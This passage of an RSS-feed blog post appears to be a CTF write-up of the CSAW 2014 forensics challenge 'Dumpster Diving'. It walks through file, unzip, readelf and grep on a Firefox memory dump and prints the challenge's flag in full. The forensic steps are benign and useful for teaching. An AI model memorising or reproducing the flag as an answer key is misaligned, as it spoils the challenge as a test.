      --help                 display this &lt;span class="nb"&gt;help &lt;/span&gt;and &lt;span class="nb"&gt;exit&lt;/span&gt;
  -v, --version              output version information and &lt;span class="nb"&gt;exit&lt;/span&gt;
  -m, --magic-file LIST      use LIST as a colon-separated list of magic
                               number files
  -z, --uncompress           try to look inside compressed files
  -b, --brief                &lt;span class="k"&gt;do &lt;/span&gt;not prepend filenames to output lines
  -c, --checking-printout    print the parsed form of the magic file, use in
                               conjunction with -m to debug a new magic file
                               before installing it
  -e, --exclude TEST         exclude TEST from the list of &lt;span class="nb"&gt;test &lt;/span&gt;to be
                               performed &lt;span class="k"&gt;for &lt;/span&gt;file. Valid tests are:
                               apptype, ascii, cdf, compress, elf, encoding,
                               soft, tar, text, tokens
  -f, --files-from FILE      &lt;span class="nb"&gt;read &lt;/span&gt;the filenames to be examined from FILE
  -F, --separator STRING     use string as separator instead of &lt;span class="sb"&gt;`&lt;/span&gt;:&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;
&lt;span class="s1"&gt;  -i, --mime                 output MIME type strings (--mime-type and&lt;/span&gt;
&lt;span class="s1"&gt;                               --mime-encoding)&lt;/span&gt;
&lt;span class="s1"&gt;      --apple                output the Apple CREATOR/TYPE&lt;/span&gt;
&lt;span class="s1"&gt;      --mime-type            output the MIME type&lt;/span&gt;
&lt;span class="s1"&gt;      --mime-encoding        output the MIME encoding&lt;/span&gt;
&lt;span class="s1"&gt;  -k, --keep-going           don&amp;#39;&lt;/span&gt;t stop at the first match
  -l, --list                 list magic strength
  -L, --dereference          follow symlinks &lt;span class="o"&gt;(&lt;/span&gt;default&lt;span class="o"&gt;)&lt;/span&gt;
  -h, --no-dereference       don&lt;span class="s1"&gt;&amp;#39;t follow symlinks&lt;/span&gt;
&lt;span class="s1"&gt;  -n, --no-buffer            do not buffer output&lt;/span&gt;
&lt;span class="s1"&gt;  -N, --no-pad               do not pad output&lt;/span&gt;
&lt;span class="s1"&gt;  -0, --print0               terminate filenames with ASCII NUL&lt;/span&gt;
&lt;span class="s1"&gt;  -p, --preserve-date        preserve access times on files&lt;/span&gt;
&lt;span class="s1"&gt;  -r, --raw                  don&amp;#39;&lt;/span&gt;t translate unprintable chars to &lt;span class="se"&gt;\o&lt;/span&gt;oo
  -s, --special-files        treat special &lt;span class="o"&gt;(&lt;/span&gt;block/char devices&lt;span class="o"&gt;)&lt;/span&gt; files as
                             ordinary ones
  -C, --compile              compile file specified by -m
  -d, --debug                print debugging messages
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We find the flag &lt;code&gt;-z&lt;/code&gt;, which allows us to look inside the zipped files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt; file -z firefox.mem.zip 
firefox.mem.zip: ELF 64-bit LSB core file x86-64, version 1 &lt;span class="o"&gt;(&lt;/span&gt;SYSV&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Zip archive data, at least v2.0 to extract&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cool! So let's go ahead and unzip this file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unzip firefox.mem.zip nzip firefox.mem.zip
Archive:  firefox.mem.zip
  inflating: firefox.mem             
   creating: __MACOSX/
  inflating: __MACOSX/._firefox.mem 
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Extra: Learning More about the &lt;em&gt;.mem&lt;/em&gt; File&lt;/h2&gt;
&lt;p&gt;This is a very weird file extension. If you google &lt;em&gt;.mem&lt;/em&gt;, you don't find much, it's clear it's a memory file, but what now?  From the &lt;em&gt;file&lt;/em&gt; command, we learned that this is an &lt;em&gt;ELF 64-bit LSB core&lt;/em&gt;. Let's understand this  by parts. &lt;/p&gt;
&lt;p&gt;An &lt;a href="http://en.wikipedia.org/wiki/Executable_and_Linkable_Format"&gt;ELF&lt;/a&gt; file  (Executable and Linkable Format) is a standard file format for executables, object code, shared libraries, and core dumps. The cool thing about ELF is that it's not bound to any particular architecture. &lt;/p&gt;
&lt;p&gt;In Linux, we can use the command &lt;a href="http://linux.die.net/man/1/readelf"&gt;readelf&lt;/a&gt; to displays information about ELF files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;readelf firefox.mem
Usage: readelf &amp;lt;option&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;&amp;gt; elf-file&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;
 Display information about the contents of ELF format files
 Options are:
  -a --all               Equivalent to: -h -l -S -s -r -d -V -A -I
  -h --file-header       Display the ELF file header
  -l --program-headers   Display the program headers
     --segments          An &lt;span class="nb"&gt;alias &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; --program-headers
  -S --section-headers   Display the sections&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; header
     --sections          An &lt;span class="nb"&gt;alias &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; --section-headers
  -g --section-groups    Display the section groups
  -t --section-details   Display the section details
  -e --headers           Equivalent to: -h -l -S
  -s --syms              Display the symbol table
     --symbols           An &lt;span class="nb"&gt;alias &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; --syms
  --dyn-syms             Display the dynamic symbol table
  -n --notes             Display the core notes &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if &lt;/span&gt;present&lt;span class="o"&gt;)&lt;/span&gt;
  -r --relocs            Display the relocations &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if &lt;/span&gt;present&lt;span class="o"&gt;)&lt;/span&gt;
  -u --unwind            Display the unwind info &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if &lt;/span&gt;present&lt;span class="o"&gt;)&lt;/span&gt;
  -d --dynamic           Display the dynamic section &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if &lt;/span&gt;present&lt;span class="o"&gt;)&lt;/span&gt;
  -V --version-info      Display the version sections &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if &lt;/span&gt;present&lt;span class="o"&gt;)&lt;/span&gt;
  -A --arch-specific     Display architecture specific information &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;if &lt;/span&gt;any&lt;span class="o"&gt;)&lt;/span&gt;
  -c --archive-index     Display the symbol/file index in an archive
  -D --use-dynamic       Use the dynamic section info when displaying symbols
  -x --hex-dump&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;number|name&amp;gt;
                         Dump the contents of section &amp;lt;number|name&amp;gt; as bytes
  -p --string-dump&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;number|name&amp;gt;
                         Dump the contents of section &amp;lt;number|name&amp;gt; as strings
  -R --relocated-dump&lt;span class="o"&gt;=&lt;/span&gt;&amp;lt;number|name&amp;gt;
                         Dump the contents of section &amp;lt;number|name&amp;gt; as relocated bytes
  -w&lt;span class="o"&gt;[&lt;/span&gt;lLiaprmfFsoRt&lt;span class="o"&gt;]&lt;/span&gt; or
  --debug-dump&lt;span class="o"&gt;[=&lt;/span&gt;rawline,&lt;span class="o"&gt;=&lt;/span&gt;decodedline,&lt;span class="o"&gt;=&lt;/span&gt;info,&lt;span class="o"&gt;=&lt;/span&gt;abbrev,&lt;span class="o"&gt;=&lt;/span&gt;pubnames,&lt;span class="o"&gt;=&lt;/span&gt;aranges,&lt;span class="o"&gt;=&lt;/span&gt;macro,&lt;span class="o"&gt;=&lt;/span&gt;frames,
               &lt;span class="o"&gt;=&lt;/span&gt;frames-interp,&lt;span class="o"&gt;=&lt;/span&gt;str,&lt;span class="o"&gt;=&lt;/span&gt;loc,&lt;span class="o"&gt;=&lt;/span&gt;Ranges,&lt;span class="o"&gt;=&lt;/span&gt;pubtypes,
               &lt;span class="o"&gt;=&lt;/span&gt;gdb_index,&lt;span class="o"&gt;=&lt;/span&gt;trace_info,&lt;span class="o"&gt;=&lt;/span&gt;trace_abbrev,&lt;span class="o"&gt;=&lt;/span&gt;trace_aranges&lt;span class="o"&gt;]&lt;/span&gt;
                         Display the contents of DWARF2 debug sections
  --dwarf-depth&lt;span class="o"&gt;=&lt;/span&gt;N        Do not display DIEs at depth N or greater
  --dwarf-start&lt;span class="o"&gt;=&lt;/span&gt;N        Display DIEs starting with N, at the same depth
                         or deeper
  -I --histogram         Display histogram of bucket list lengths
  -W --wide              Allow output width to exceed 80 characters
  @&amp;lt;file&amp;gt;                Read options from &amp;lt;file&amp;gt;
  -H --help              Display this information
  -v --version           Display the version number of readelf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In addition, &lt;a href="http://en.wikipedia.org/wiki/Linux_Standard_Base"&gt;LSB&lt;/a&gt; stands for &lt;em&gt;Linux Standard Base&lt;/em&gt;, which is a joint project by several Linux distributions. It specifies standard libraries, a number of commands and utilities that extend the POSIX standard, the layout of the file system hierarchy, run levels, the printing system, etc.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Extracting Information from the &lt;em&gt;.mem&lt;/em&gt; File&lt;/h2&gt;
&lt;p&gt;It turned out that we don't even need to know anything about the file to find the flag. All we need to do is to search for the &lt;em&gt;flag&lt;/em&gt; string:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat firefox.mem | grep -a &lt;span class="s1"&gt;&amp;#39;flag{&amp;#39;&lt;/span&gt;
P��negativeone_or_fdZZZZZZZZZZZZnegativeone_or_nothingZZnegativeone_or_ssize_tZZd_name_extra_sizeZZZZZZZZZZZZnull_or_dirent_ptrZZZZZZZZZZOSFILE_SIZEOF_DIRZZZZZZZZZZZZ���� 3���������ZZZZZZZH�f�L��L��ZZ����@�m���������ZZZZZZZAG�@r���y��ZZZZZZZZflag&lt;span class="o"&gt;{&lt;/span&gt;cd69b4957f06cd818d7bf3d61980e291&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yay! We found the flag: &lt;strong&gt;cd69b4957f06cd818d7bf3d61980e291&lt;/strong&gt;!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">bt3gl</dc:creator><pubDate>Mon, 22 Sep 2014 06:20:00 -0400</pubDate><guid>tag:bt3gl.github.io,2014-09-22:forensics-100-dumpster-diving.html</guid><category>CTF</category><category>CSAW</category><category>Forensics</category></item></channel></rss>